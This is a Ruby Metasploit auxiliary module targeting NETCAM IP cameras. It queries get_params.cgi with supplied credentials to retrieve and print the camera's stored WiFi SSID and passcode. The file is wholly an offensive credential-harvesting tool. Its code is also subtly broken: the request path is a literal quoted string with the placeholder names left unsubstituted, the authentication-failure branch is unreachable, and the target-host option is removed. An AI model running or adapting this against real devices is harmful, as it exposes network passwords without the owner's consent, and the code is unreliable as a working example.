##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::HttpClient

    def initialize
      super(
          'Name'            => %q(NETCAM WiFi Enumeration),
          'Description'     => %q(Uses the get_params.cgi script within the camera web service to list WiFi SSID and passcode.),
          'Author'          => [
              'Terry Antram - 3antrt67[at]solent.ac.uk'
          ],
          'License'         => MSF_LICENSE 
      )

      deregister_options('RHOST')
      register_options(
          [ 
              Opt::RPORT(18881), 
              OptString.new('USERNAME', [ true, 'Camera username' ]),
              OptString.new('PASSWORD', [ true, 'Camera password' ]),
          ])
    end

    def run
      uri = '"/get_params.cgi?&loginuse=" + USERNAME + "&loginpas=" + PASSWORD + "&user=" + USERNAME + "&pwd=" + PASSWORD + "&"'

      print_status("Attempting enumeration...")
      req = send_request_cgi({
          'uri'     => uri,
          'method'  => 'GET',
      })

      if not req
        print_error("There has been no response received...")
      return
      elsif req.code == 200
        print_good("Camera has responded successfully.")
        print_status("#{req.headers}")
        print_good("#{req.body}")
        disconnect
      elsif req.code == 200 and req.body == 'var result="Auth Failed"'
        print_error("Incorrect Username/Password combination..")
      else
        print_error("Error has occurred.")
      end
    end
end
